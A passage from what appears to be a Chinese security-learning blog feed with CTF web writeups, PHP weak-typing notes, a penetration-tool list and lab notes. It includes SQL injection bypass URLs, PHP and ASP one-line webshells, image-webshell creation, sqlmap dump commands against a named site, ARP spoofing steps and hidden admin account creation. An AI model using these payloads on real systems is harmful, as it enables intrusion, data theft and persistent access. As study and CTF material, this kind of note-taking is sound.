setInterval(function(){xhr(‘./getScore.php’,function(e){<br>                var r = JSON.parse(e);<br>                if(r.state == 200)<br>                    game.addScore(r.score);<br>                else{<br>                    alert(r.msg);<br>                    game.start()<br>                }</p><pre><code>        })},1000)</code></pre><p>弹出flag</p><h1 id="自动获取flag小程序"><a href="#自动获取flag小程序" class="headerlink" title="自动获取flag小程序"></a>自动获取flag小程序</h1><p>源码中找到param1.php<br>访问响应结果<br><code>{&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;}</code><br>URL解码后得到<br><code>[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,    &quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]</code><br>分析calParam2可知用数组中的数进行求和运算。</p><p>修改//请求flag中的参数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WebWriteup &lt;/p&gt;
&lt;h1 id=&quot;Logic&quot;&gt;&lt;a href=&quot;#Logic&quot; class=&quot;headerlink&quot; title=&quot;Logic&quot;&gt;&lt;/a&gt;Logic&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;Burp抓包发现管理员账号&lt;a href=&quot;mailto:chen
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php弱类型漏洞记录</title>
    <link href="http://yoursite.com/2018/10/28/PHP%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/10/28/PHP语言漏洞/</id>
    <published>2018-10-28T10:41:30.634Z</published>
    <updated>2018-10-28T10:41:30.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h1><ul><li>is_set()是否初始化       </li><li>empty()检测变量是否为空（0/false/array()/）               </li><li>$a==null判断是否为null(必须初始化)      </li><li>is_null()仅变量为null返回true。</li><li>$a===null 仅为null返回true</li><li>注意区分NULL和空            </li></ul><p>strpos()查找字符串在另一字符串出现的位置。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类型判断&quot;&gt;&lt;a href=&quot;#类型判断&quot; class=&quot;headerlink&quot; title=&quot;类型判断&quot;&gt;&lt;/a&gt;类型判断&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;is_set()是否初始化       &lt;/li&gt;
&lt;li&gt;empty()检测变量是否为空（0/false/ar
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>工具大全收集</title>
    <link href="http://yoursite.com/2018/10/18/%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/"/>
    <id>http://yoursite.com/2018/10/18/工具集合/</id>
    <published>2018-10-17T16:25:43.790Z</published>
    <updated>2018-10-17T16:25:43.947Z</updated>
    
    <content type="html"><![CDATA[<p>首先是渗透流程</p><ol><li><p>综合扫描</p></li><li><p>目录检测</p></li><li><p>注入检测</p></li><li><p>旁注与c段</p></li><li><p>抓包改包</p></li><li><p>webshell</p></li><li><p>提权工具</p></li><li><p>arp嗅探</p></li><li><p>社会工程</p></li><li><p>破解工具</p></li><li><p>字典相关</p></li><li><p>痕迹清理</p></li><li><p>漏洞利用</p></li><li><p>后门程序</p></li><li><p>其他工具</p></li><li><p>渗透学习</p></li></ol><p>工具细节：</p><p>1.综合检测</p><p>appscan、burp、JSky、safe3wvs、苹果FTP批量扫描工具、WebCruiser、WebSploit Toolkit V.1.9、wvs、x站神器3.7、x站神器3.7、cv6、百度新闻源挖掘机</p><p>2.目录检测</p><p>chrome后台扫描插件、Pker多线程后台极速扫描工具、WebRobot、WebScan、Wordpress爆路径工具、wwwscan三个版本（单个、批量、扫备份）、清凉扫描</p><p>3.注入检测</p><p>COOKIE注入工具、Havij、HDSI3.0、NBSI、Oracle_反弹注入工具v1.0、SqlMap免Python环境绿色版、sqlmap中文包、穿山甲Pangolin、穿山甲Pangolin、河马MySQL注入工具、河马PostgreSQL注入工具、河马SQLServer注入工具、明小子、手工注入辅助工具、注入中转、GetWebShell增强版、啊d注入工具、mysql注入辅助程序、小葵多功能转换工具</p><p>4.旁站与c段</p><p>Happy工具箱、Layer、python二级域名批量采集脚本、python抓取谷歌链接工具、长安刺客旁注杀手、超级旁注、御剑1.5、御剑后台扫描珍藏版、御剑无字典大小限制1937版、3EST 旁注扫描器、T00ls内部旁注扫描器(需要.net环境)、二级域名爆破工具、鬼哥旁注C段利器</p><p>5.抓包该包</p><p>COOKIES browser、MatriXay1073、smsniff、WSockExpert、WSockExpert_Cn、Fiddler2原版、HttpAnalyzerFullTrial_V6、WSExplorer 1.3、网络抓包工具</p><p>6.webshell</p><p>ASP马、aspx马、aspx一句话及客户端、cfm马、cgi马、jsp马、php马、war马、两用一句话图片马、数据库解压、中国菜刀（最新过狗2013-12-20）、一句话大全</p><p>7.提权工具</p><p>hash读取、无net提权、巴西烤肉、lxc、linux、iis、exp大全、端口转发、3389大全、dll、udf、nc、lpk、星外、s-u、无组件提权</p><p>8.arp嗅探</p><p>Arp EMP v1.0、cain_v4.9汉化版、MAC地址扫描器、NetFuke、幻境网盾3.7、ARPKiller.exe、嗅探马</p><p>9.社会工程</p><p>EMailSearch、MB社工辅助工具包、theHarvester-免py环境版、社工利器-手机信息查询、身份证查询、邮件伪造、MaltegoInstaller-v202-CE</p><p>10.破解工具</p><p>各种数据库破解、密文破解、webshell破解</p><p>11.字典相关</p><p>3389字典、idc机房字典、字典生成器</p><p>12.痕迹清理</p><p>cleaniis、CleanIISLog、clearlogs、IE记录清理、常用**清除器、清除IIS日志logcleaner1.0、日志清除器、无影无踪4.4、组策略清除工具1.1</p><p>13.漏洞利用</p><p>dedecms5.7、Fckeditor综合利用工具、struts2 漏洞利用工具、撸大师1.7、Discuz! X Getshell、IIS写权限利用工具、phpcms利用工具</p><p>14.后门程序</p><p>LPK2.0、shift后门、T00ls Lpk Sethc v4、T00ls_Lpk_Sethc_v3、不死帐号、截取3389、lpk sethc v4、全盘感染shift后门、添加超级隐藏账户、隐藏后门 除非重装、最新shift后门</p><p>15.其他工具</p><p>Converter-zh_CN、HconSTF_v0.4_portable、putty、SQL连接、数据库浏览器、Codeeer Explorer、OWASP Mantra - Armada Win、鬼哥多功能浏览器、1937专用记事本、键盘记录器</p><p>By：Day - </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先是渗透流程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;综合扫描&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;目录检测&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;注入检测&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;旁注与c段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;抓包改包&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;we
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>实验吧Writeup</title>
    <link href="http://yoursite.com/2018/09/30/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    <id>http://yoursite.com/2018/09/30/实验吧/</id>
    <published>2018-09-30T15:06:48.086Z</published>
    <updated>2018-12-04T14:39:49.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>MYSQL #后面内容会被注释<br>version()获取数据库版本<br>@@version_compile_os获取操作系统</p><h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看源码<br><img src="https://i.imgur.com/appELmb.png" alt=""><br>md5弱类型构造user:s878926199a md5加密为0<br><img src="https://i.imgur.com/hzta7UG.png" alt=""><br>构造serialize，bool类型为True<br>根据<img src="https://i.imgur.com/DlXwh4m.png" alt=""><br>构造代码：</p><pre><code>&lt;?php$test1=array(&quot;user&quot;=&gt;true,&quot;pass&quot;=&gt;true);echo var_dump($test1);echo var_dump(serialize($test1));?&gt;</code></pre><p>pass修改拿flag</p><h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>key: vim编辑时产生隐藏文件swp即后缀名为.swp，文件退出自动删除。<br>隐藏文件前面加.</p><p>查看源码发现关键信息，Vim编辑和admin邮箱地址</p><ol><li><p>输入1弹出<br><img src="https://i.imgur.com/fLRKRmQ.png" alt=""><br>访问<code>http://ctf5.shiyanbar.com/10/upload/step2.php</code>发现返回step1。                  </p></li><li><p>Burp截包发现跳转到submit.php验证<br>访问<code>http://ctf5.shiyanbar.com/10/upload/submit.php</code>发现不是管理员，由此想到隐藏文件<code>.submit.php.swp</code>访问之后，发现token验证。<br><img src="https://i.imgur.com/UJu82yd.png" alt=""></p></li><li><p>利用0e00000000绕过<br><img src="https://i.imgur.com/pAotWoT.png" alt=""></p><pre><code> payload:http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</code></pre><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>注意Python3中的bytes-str的转换<br>Burp抓包发现Flag，每次提交Flag变化，脚本提交。</p></li></ol><p>脚本如下</p><pre><code>import requestsimport base64url=&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;r=requests.get(url)if &#39;FLAG&#39;in r.headers:        x=bytes(r.headers[&#39;FLAG&#39;],&quot;utf-8&quot;)        key=base64.b64decode(x).decode(&#39;utf-8&#39;).split(&#39;:&#39;)[1]        data={&#39;key&#39;:key}        print(requests.post(url,data=data).text)</code></pre><h1 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h1><p>空格+关键词绕过</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  schema.name  fromfrom  infromation_schema.schemata  wherewhere &#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  &#39;1&#39;=&#39;1</code></p><p>coulumn_name被绕过，因此修改绕过字段</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_scheminformation_schema.columnsa.columns  wherewhere  table_name=&#39;flag</code></p><p>找到字段flag查找<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  flag  fromfrom  flag  wherewhere  &#39;1&#39;=&#39;1</code></p><h1 id="简单的注入2"><a href="#简单的注入2" class="headerlink" title="简单的注入2"></a>简单的注入2</h1><p>与1不同的是并非关键字和空格，过滤掉所有空格，没有回显。</p><p>爆库 表 和列换注释绕过空格<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/columcolumn_namen_name/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/web/index_2.php?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p><h1 id="简单的注入3"><a href="#简单的注入3" class="headerlink" title="简单的注入3"></a>简单的注入3</h1><h1 id="NSCTF"><a href="#NSCTF" class="headerlink" title="NSCTF"></a>NSCTF</h1><p>很简单的一个密码变换。一个逆序过程。附代码</p><pre><code class="php">&lt;?php$_=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;$a=strrev(base64_decode((strrev((str_rot13($_))))));    for($i=0;$i&lt;strlen($a);$i++){        $b=substr($a,$i,1);        $c=ord($b)-1;        $d=chr($c);        $e=$e.$d;    }    echo &quot;$e&quot;;?&gt;</code></pre><h1 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h1><p>抓包看到 6c525af4059b4fe7d8c33a.txt,访问之后看到源码。<br>分析源码要满足条件</p><ol><li>number不是数字</li><li>$req[‘number’]==strval(intval($req[‘number’]</li><li>$value1 = intval($req[“number”]);<br>$value2 = intval(strrev($req[“number”]));要相等<br>$number不是回文数  </li></ol><p>操作系统，32位有符号数int范围-2147483648~2147483647，<br>构造<code>2147483647%00</code>绕过</p><p>tips:strval会忽略掉%00与%20 </p><h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>urldecode让URL解码后，等于hackerDj,因为提交的时候浏览器会自动解码一次，PHP处理时解码一次，故解码两次。因此对hackerDJ进行URL编码两次构造<br><code>http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ</code></p><p>flag;</p><h1 id="这看起来有点简单"><a href="#这看起来有点简单" class="headerlink" title="这看起来有点简单"></a>这看起来有点简单</h1><p>常规注入。未加任何<br><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,schema_name from information_schema.schemata</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,table_name from information_schema.tables where table_schema=’my_db’;</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,k0y from thiskey</p><h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>抓包构造 X-Forwarder-for:1.1.1.1<br>客户端最原始的IP地址</p><h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>1.Tips很明确，修改头部，条件检测 .net framework 9.9,官方文档说检测到他会在头部UA中加入 <code>.NET CLR 9.9</code><br>2.伪造IE浏览器加入  <code>compatible; MSIE 9.0；</code>信息</p><h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>sleep注入   wait….</p><h1 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h1><p>查看代码分析，根据随机生成器生成数字，要使Session的password跟输入的password相等。删除COOKIE 中  PHPSESSID,删除password值。<br>null=null,通过验证。  </p><h1 id="False"><a href="#False" class="headerlink" title="False"></a>False</h1><p>md5和sha1无法处理数组，处理结果都为null,构造<br><code>http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2</code></p><h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>抓包，将showsource改为1；发现隐藏表单字段。提交正确PIN码即可。</p><h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><p>ereg函数存在截断漏洞， %00截断，ereg不会解析后面的字符。<br>利用科学记数法绕过数字大小。<br><code>http://ctf5.shiyanbar.com/web/more.php?password=1e8%00*-*</code></p><h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>关键点<br>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) </p><p>密码值经过md5加密后相等，构造查询语句使得$sql查询语句返回md5(1)的值，构造<br>`user=1’ union select ‘c4ca4238a0b923820dcc509a6f75849b’</p><p><code>1</code></p><h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>主要考察SQL基本功；看到代码分析。</p><p>过滤了关键字$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</p><p>不能使用这些关键字查询。</p><p>但是有一个mysql_num_rows($query) == 1判断。</p><p>使用 limit 1 offset 0进行限制绕过。</p><p>看了大佬的writeup知道 with rollup 可进行分组统计数据基础上再进行相同的统计。<br>使用 <code>1&#39; or 1=1 group by pwd with rollup limit 1 offset 2#</code></p><p>恰好使 pwd=null, 然后  if(null=null)绕过 。</p><h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>伪静态技术<br>构造<code>http://ctf5.shiyanbar.com/indirection/index.php/user/index.php</code>会把user解析为参数名，把后面的index.php解析为参数值。</p><p>#</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;MYSQL #后面内容会被注释&lt;br&gt;version()获取数据库版本&lt;br&gt;@@version_compile_o
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>攻击实践</title>
    <link href="http://yoursite.com/2018/09/27/%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2018/09/27/实战/</id>
    <published>2018-09-27T15:38:27.898Z</published>
    <updated>2018-10-07T15:06:28.764Z</updated>
    
    <content type="html"><![CDATA[<p>ARP中间人攻击</p><p>一面伪造网关，一面伪造源主机    </p><p>Kali:ifconfig查看IP地址<br>nmap -sP ip/24查看局域网网络<br>echo 1 &gt;/proc/sys/net/ipv4/ip_forward 开启IP转发，不开启会断网<br>arpspoof -i eth0 ip host<br>ettercap -Tq -i eth0 监控流量<br>driftnet -i eth0 捕获页面        </p><p>ettercap -G 工具图形界面。            </p><p>2.常用端口<br>TCP:<br>20:FTP数据<br>21:FTP控制 文件传输<br>22:SSH<br>25:SMTP<br>80:WWW(HTTP)<br>110:POP<br>443:SSL<br>443:HTTPS<br>1080:SOCKS<br>UDP:<br>7:ECHO<br>53:DNS<br>69:TFTP<br>数据库端口<br>1433:SQL SERVER<br>3306:MYSQL</p><p>3.添加账户<br>添加管理员用户 net user hacker 123456 /add<br>添加管理员组 net loaclagroup administrators hacker /add</p><p>4.提权<br>server-u 43958提权</p><p>5.完整渗透<br>注入漏洞—获得管理员密码进入后台—数据库备份拿到webshell-登陆webshell，提权拿下服务器权限。</p><p>6.web渗透<br>String.fromCharCode()接受Unicode值，返回字符串<br>XSS漏洞弹窗xss<br>绕过方式<br>1.<script>alert(“XSS”);;;;;;</scrpit>分号截断。<br>2.<script>alert（String.fromCharCode(120,115,115)）</scrpit><br>3.console输入alert(‘xss’)<br>4.msg=xss;<br>5.sql注入</p><ul><li>检查注入点’</li><li>查询列数</li><li>查询回显位置</li><li>回显位置插入语句</li><li></li></ul></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ARP中间人攻击&lt;/p&gt;
&lt;p&gt;一面伪造网关，一面伪造源主机    &lt;/p&gt;
&lt;p&gt;Kali:ifconfig查看IP地址&lt;br&gt;nmap -sP ip/24查看局域网网络&lt;br&gt;echo 1 &amp;gt;/proc/sys/net/ipv4/ip_forward 开启IP转发
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>墨者学院</title>
    <link href="http://yoursite.com/2018/09/25/%E5%A2%A8%E8%80%85/"/>
    <id>http://yoursite.com/2018/09/25/墨者/</id>
    <published>2018-09-25T11:32:40.552Z</published>
    <updated>2018-10-29T15:40:39.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SVN信息漏洞"><a href="#SVN信息漏洞" class="headerlink" title="SVN信息漏洞"></a>SVN信息漏洞</h1><p>Subversion</p><p>URL后面加.svn/entries访问，如存在漏洞可显示成功</p><p>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，目录内容有wc.db文件管理。查看内容</p><h1 id="Web文件上传漏洞"><a href="#Web文件上传漏洞" class="headerlink" title="Web文件上传漏洞"></a>Web文件上传漏洞</h1><ul><li>0X00截断漏洞(<a href="http://xx/upfiles/lubr.php.jpg" target="_blank" rel="noopener">http://xx/upfiles/lubr.php.jpg</a> “.”换成0X00，“.”的ASII码值为0x2e)    </li><li>构造服务器端扩展名检测上传（lubr.php改成lubr.php.abc）    </li><li>绕过Content-Type检测文件类型上传(修改符合白名单)    </li><li>构造图片木马，绕过文件内容检测上传Shell（文件内容验证    getimeagesize()，制作图片马  copy 1.jpg/b+2.php/a 3.jpg）    </li></ul><p>php： &lt;?php @eval($_POST[‘chopper’]);?&gt;<br>asp:  &lt;eval request(“pass”)%&gt;<br>aspx  &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><p><strong>注入技术：盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入</strong></p><p>检查注入点<br>sqlmap.py -u “<a href="http://www.scshlx.com/TeachView.asp?id=21&quot;" target="_blank" rel="noopener">http://www.scshlx.com/TeachView.asp?id=21&quot;</a><br>列数据库/表<br>sqlmap -u “” –dbs/–tables/<br>列字段<br>sqlmap -u “” -T “指定表名admin” –columns<br>指定库表段列出内容<br>sqlmap -u “” –dump -T “admin” -C “username,password”<br>查询所有字段<br>sqlmap -u “” –tables –columns<br>mysql注入<br>–dbs –current-db –users –current-user –tables-D<br>-T””-D””–colums    </p><p>脱裤<br>-dump-all    </p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>‘ /and 1=1/and 1=2猜注入点<br>and exists(select * from admin)猜表名<br>and exists(select admin from admin)猜列名<br>and(select top 1 len(admin) from admin &gt;1))猜字段长度<br>and(select top 1 asc(mid(admin,1,1)) from admin&gt;97)猜字段字符ASII    </p><p>union 手工，先order by 1++;猜字段长度。<br>select 1,2…. from admin 猜字段编号<br>select 1,admin,password,… 爆名和密码    </p><p>@@global.version_compile_os from mysql.user() – 猜os<br>1’ and 1=2 union select 1,schema_name from information_schema.schemata – 爆所有库名    </p><p>预防数据库攻击<br>mysql_real_escape_string()转义字符串中的特殊字符<br>stripslashes($value)去除斜杠<br>is_numeric($id)检查id是否为数字    </p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>利普通用户XSS存储实现创建管理员账户的CSRF利用    </p><h1 id="数据库备份拿webshell"><a href="#数据库备份拿webshell" class="headerlink" title="数据库备份拿webshell"></a>数据库备份拿webshell</h1><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><ul><li>IIS 6.0    </li></ul><ul><li>目录解析 x.com/x.asp/x.jpg 默认把.asp，.asp目录下文件解析成asp文件    </li><li><p>文件解析 x.com/x.asp;.jpg默认不解析;后面内容    </p></li><li><p>默认可执行<br>test.asa/test.cer/test.cdx    </p></li></ul><ul><li>Apache<br>从右至左判断，后缀名无法判断往左判断。test.php.awe.asd会解析php文件<br>形式 xx.com/test.php.php123<br>其他漏洞：<br>conf配置AddHandler php5-script .php 文件名只要包含.php会以php执行    </li></ul><p>AddType application/x-httpd-php .jpg 会以jpg执行    </p><ul><li>IIS7.X(x自定义，只能执行php)    </li></ul><p>正常命名：<a href="http://www.xxx.com/logo.jpg" target="_blank" rel="noopener">www.xxx.com/logo.jpg</a>    </p><p>触发解析漏洞命名：<a href="http://www.xxx.com/logo.jpg/x.php" target="_blank" rel="noopener">www.xxx.com/logo.jpg/x.php</a>    </p><ol><li>Nginx同iis7.x一致    </li></ol><h1 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h1><p>如果碰到getimagesize()函数检测，判断文件是否为有效文件图片。<br>copy a.jpg/b + b.php/a PicLubr.jpg </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SVN信息漏洞&quot;&gt;&lt;a href=&quot;#SVN信息漏洞&quot; class=&quot;headerlink&quot; title=&quot;SVN信息漏洞&quot;&gt;&lt;/a&gt;SVN信息漏洞&lt;/h1&gt;&lt;p&gt;Subversion&lt;/p&gt;
&lt;p&gt;URL后面加.svn/entries访问，如存在漏洞可显示成功&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验</title>
    <link href="http://yoursite.com/2018/09/22/Net%20security/"/>
    <id>http://yoursite.com/2018/09/22/Net security/</id>
    <published>2018-09-22T07:33:55.700Z</published>
    <updated>2018-11-07T02:09:40.936Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 快捷键：<br>终端:<br>复制命令：Ctrl + Shift + C  组合键    .    </p><p>粘贴命令：Ctrl + Shift + V  组合键           </p><p>控制台：<br>复制命令：Ctrl + Insert  组合键　　或　　用鼠标选中即是复制。         </p><p>粘贴命令：Shift + Insert  组合键　　或　　单击鼠标滚轮即为粘贴。                 </p><h1 id="server-u"><a href="#server-u" class="headerlink" title="server-u"></a>server-u</h1><p>Nessus扫描主机。<br>serv-u目录遍历漏洞<br>CMD中输入:<br>ftp ip;<br>ftp； 匿名登陆<br>ls 查看目录，<br>get ../ftp/1.txt获取1.txt文件   </p><p>503 服务器出错<br>404 网页程序出错   </p><h1 id="主机存活性"><a href="#主机存活性" class="headerlink" title="主机存活性"></a>主机存活性</h1><p>ping 发送四次ICMP报文得到回显。<br>ping 探测网段内存活主机。各种命令使用   </p><p>Nmap superScan工具判断主机存活性<br><code>nmap -sn 172.17.135.6-172.17.135.122</code>  空扫描    </p><p>Fping发现网段内存活主机探测。<br><code>fping –a –g 172.17.135.6 172.17.135.122</code> -a 响应目标 -g 起始地址和终止地址    </p><h1 id="主机信息探测"><a href="#主机信息探测" class="headerlink" title="主机信息探测"></a>主机信息探测</h1><p>X-scan探测主机敏感信息<br>MBSA探测主机一些安全配置。   </p><h1 id="端口服务探测"><a href="#端口服务探测" class="headerlink" title="端口服务探测"></a>端口服务探测</h1><p>公认端口；HTTP协议80端口<br>注册端口；<br>动态/私有端口；</p><p>netstat -a -n -o<br>-a 所有socket -n 网路地址代替名称+状态  -o 加上进程PID显示    </p><p>ftp ip 测试21端口ftp服务<br>telnet ip 测试23端口telnet服务<br>mstsc /v ip 测试3389端口可远程连接   </p><p>ScanPort扫描<br>SuperScan扫描<br>nmap扫描 nmap -T4 -A -v ip    </p><h1 id="Wireshark抓包实验"><a href="#Wireshark抓包实验" class="headerlink" title="Wireshark抓包实验"></a>Wireshark抓包实验</h1><p>捕捉TCP包分析<br>捕捉PING命令发送的ICMP包一个request+一个reply;   </p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>RST比特用来复位，TCP连接三种情况：<br>1.不存在连接端口请求<br>2.异常终止一个链接。<br>3.检测半关闭连接  </p><p>1.全TCP连接 connect()，<br>2.SYN半打开，（应答包含SYN和ACK，端口打开）<br>3.FIN秘密（应答RST端口关闭，否则丢包端口开启)变种 X-mas和Null  （打开和关闭标记）适用Unix主机<br>5.UDP ICMP （Windows适用 ）    </p><p>命令总结：<br>-sT：扫描TCP数据包以建立的连接connect()</p><p>-sS：扫描TCP数据包带有SYN数据的标记（发送SYN,收到SYN|ACK，发送RST代替ACK，连接终止，三次握手未实现。）</p><p>-sP：以ping方式进行扫描</p><p>-sU：以UDP数据包格式进行扫描</p><p>-sF,-sX,-sN：以Fin,Xmas,Null方式扫描      </p><h1 id="Sniffer嗅探使用"><a href="#Sniffer嗅探使用" class="headerlink" title="Sniffer嗅探使用"></a>Sniffer嗅探使用</h1><p>捕获局域网之间的信息传输。<br>例如捕获FTP包和HTTP包。<br>Matrix — Capture— Decode.</p><h1 id="Linux路由信息探测"><a href="#Linux路由信息探测" class="headerlink" title="Linux路由信息探测"></a>Linux路由信息探测</h1><p>info traceroute查看路由信息<br>mii-tool查看当前网络<br>ifconfig eth0 ip netmask 子网掩码 up<br>route add default gw 网关<br>ifconfig查看配置信息<br>traceroute 域名</p><h1 id="域名信息探测"><a href="#域名信息探测" class="headerlink" title="域名信息探测"></a>域名信息探测</h1><p>nslookup； 查询DNS记录；查看域名解析是否正常；<br>set type=any 所有类型记录；</p><p>10.路由信息探测</p><h1 id="主机信息探测实验"><a href="#主机信息探测实验" class="headerlink" title="主机信息探测实验"></a>主机信息探测实验</h1><p>X-scan<br>MBSA</p><p>12.交换式网络嗅探<br>集线器共享式网络<br>交换机交换式网络</p><h1 id="操作系统指纹探测"><a href="#操作系统指纹探测" class="headerlink" title="操作系统指纹探测"></a>操作系统指纹探测</h1><p>ping TTL=128Windows TTL=235左右 Unix家族</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>EIP 指令指针<br>EBP 栈底指针<br>ESP 栈顶指针</p><h1 id="scanport"><a href="#scanport" class="headerlink" title="scanport"></a>scanport</h1><p>扫描端口</p><h1 id="Stinger病毒查杀"><a href="#Stinger病毒查杀" class="headerlink" title="Stinger病毒查杀"></a>Stinger病毒查杀</h1><h1 id="Jsky扫描网站漏洞"><a href="#Jsky扫描网站漏洞" class="headerlink" title="Jsky扫描网站漏洞"></a>Jsky扫描网站漏洞</h1><h1 id="IISwrite漏洞利用"><a href="#IISwrite漏洞利用" class="headerlink" 